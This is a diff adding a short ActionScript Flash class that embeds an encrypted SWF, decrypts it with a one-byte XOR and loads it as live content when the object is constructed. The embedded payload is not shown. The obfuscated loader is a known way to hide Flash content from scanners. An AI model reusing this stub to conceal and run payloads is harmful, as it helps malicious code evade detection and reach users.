@@ -1,0 +1,47 @@
+package testflash2
+{ 
+	import flash.display.*;
+	import flash.text.*;
+	import flash.utils.*;
+	import flash.net.*;
+	import flash.events.*;
+    import flash.system.*;
+ 
+
+    public class testflash2 extends Sprite
+    {
+        [Embed(source="testflash1.swf.enc", mimeType="application/octet-stream")]
+        private static const DSs7dks:Class;
+        
+        
+        private function decrypt(encrypted:ByteArray):ByteArray
+        {
+            var decrypted:ByteArray = new ByteArray();
+            
+            for (var i:int = 0; i < encrypted.length; i++)
+            {
+                var byte:int = encrypted.readByte();
+                decrypted.writeByte(byte^0x0a);
+            }
+            return decrypted;
+        }
+        
+
+        public function testflash2()
+        {
+            
+            // Load embedded content
+            var x:Loader = new Loader();
+            var y:LoaderContext = new LoaderContext();
+            
+            var swfObj:Object = new DSs7dks();
+            var u:ByteArray = swfObj as ByteArray;
+            var v:ByteArray = decrypt(u);
+            
+            x.loadBytes(v, y);
+            
+            addChild(x);    
+            
+        }
+    } 
+}
